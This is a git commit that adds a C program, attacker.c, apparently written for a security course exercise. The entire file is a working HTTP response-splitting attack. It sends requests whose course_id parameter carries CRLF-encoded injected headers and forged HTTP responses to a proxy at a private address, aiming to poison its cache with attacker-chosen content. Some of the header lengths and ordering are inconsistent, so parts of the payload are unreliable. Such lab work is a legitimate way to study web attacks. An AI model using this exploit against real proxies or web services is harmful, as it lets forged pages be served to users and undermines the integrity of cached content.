6ad17c9e136d90b64c5d4ccca45b11ca0d3591d3
YousefAGO <97043151+YousefAGO@users.noreply.github.com>
2025-01-20 12:52:35 +0200

    Create attacker.c

---
+++ ex3/attacker.c
@@ -0,0 +1,119 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <arpa/inet.h>
+
+#define PROXY_IP "192.168.1.202" // Proxy server IP
+#define PROXY_PORT 8080          // Proxy server port
+#define RESPONSE_BUFFER_SIZE 8192
+
+void send_http_response_splitting_attack() {
+    int sockfd;
+    struct sockaddr_in proxy_addr;
+    char attack_request[1024];
+    char proxy_response[1024];
+
+     snprintf(attack_request, sizeof(attack_request),
+         "GET /cgi-bin/course_selector HTTP/1.1\r\n"
+         "Host:192.168.1.202\r\n"
+         "Content-Type:application/x-www-form-urlencoded\r\n"
+         "Content-Length:%lu\r\n\r\n"
+         "course_id=67607%%0d%%0aConnection:%%20Keep-Alive%%0d%%0a%%0d%%0a"
+         "HTTP/1.0%%20200%%20OK%%0d%%0aContent-Type:%%20text/html%%0d%%0a"
+         "Content-Length:%%2020%%0d%%0a%%0d%%0a<html>212973481</html>",
+         strlen("course_id=67607%0d%0aConnection:%20Keep-Alive%0d%0a%0d%0a"
+                "HTTP/1.0%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a"
+                "Content-Length:%2020%0d%0a%0d%0a<html>212973481</html>"));
+
+
+    // Create a socket
+    sockfd = socket(AF_INET, SOCK_STREAM, 0);
+    if (sockfd < 0) {
+        perror("Socket creation failed");
+        exit(EXIT_FAILURE);
+    }
+
+    // Configure the proxy address
+    memset(&proxy_addr, 0, sizeof(proxy_addr));
+    proxy_addr.sin_family = AF_INET;
+    proxy_addr.sin_port = htons(PROXY_PORT);
+    if (inet_pton(AF_INET, PROXY_IP, &proxy_addr.sin_addr) <= 0) {
+        perror("Invalid proxy IP address");
+        close(sockfd);
+        exit(EXIT_FAILURE);
+    }
+
+    // Connect to the proxy server
+    if (connect(sockfd, (struct sockaddr *)&proxy_addr, sizeof(proxy_addr)) < 0) {
+        perror("Connection to proxy server failed");
+        close(sockfd);
+        exit(EXIT_FAILURE);
+    }
+
+    // Send the crafted HTTP request
+    if (send(sockfd, attack_request, strlen(attack_request), 0) < 0) {
+        perror("Failed to send attack_request");
+        close(sockfd);
+        exit(EXIT_FAILURE);
+    }
+    
+    
+
+    printf("Malicious attack_request sent to the proxy.\n");
+    
+    // Receive the response from the proxy server
+    ssize_t bytes_received = recv(sockfd, proxy_response, sizeof(proxy_response) - 1, 0);
+    if (bytes_received < 0) {
+        perror("Failed to receive response from proxy");
+        close(sockfd);
+        exit(EXIT_FAILURE);
+    }
+    
+
+
+
+    char injected2_response[RESPONSE_BUFFER_SIZE];
+
+snprintf(injected2_response, sizeof(injected2_response),
+         // First response
+        "GET /cgi-bin/course_selector?course_id=67607%%0d%%0a"
+         "Content-Type:%%20text/html%%0d%%0a"
+         "Content-Length:%%2018%%0d%%0a%%0d%%0a"
+         "<html>Hello</html>%%0d%%0a%%0d%%0a"
+         "Connection:%%20Keep-Alive%%0d%%0a%%0d%%0a"
+         
+
+         // Second response
+         "HTTP/1.1%%20200%%20OK%%0d%%0a"
+         
+          "Last-Modified:%%20Sun,%%2019%%20Jan%%202025%%2019:07:00%%20GMT%%0d%%0a"
+         "Content-Type:%%20text/html%%0d%%0a"
+         "Content-Length:%%2039%%0d%%0a" // Matches "212973481" content size
+          "Cache-Control:%%20public,%%20max-age=3600%%0d%%0a"
+         "<!DOCTYPE%%20html>%%20<html>212973481</html>"
+          "Connection:%%20Keep-Alive%%0d%%0a%%0d%%0a"
+          "HTTP/1.1\r\nHost: 192.168.1.202:8080\r\nConnection: Keep-Alive\r\n\r\n"
+          );
+
+         
+      if (send(sockfd, injected2_response, strlen(injected2_response), 0) < 0) {
+        perror("Failed to send combined_response");
+        close(sockfd);
+        exit(EXIT_FAILURE);
+    }
+
+
+
+    printf("Combined normal and injected responses sent to the proxy.\n");
+    // Close the socket
+    close(sockfd);
+}
+
+int main() {
+    send_http_response_splitting_attack();
+    return 0;
+}
+
+
+
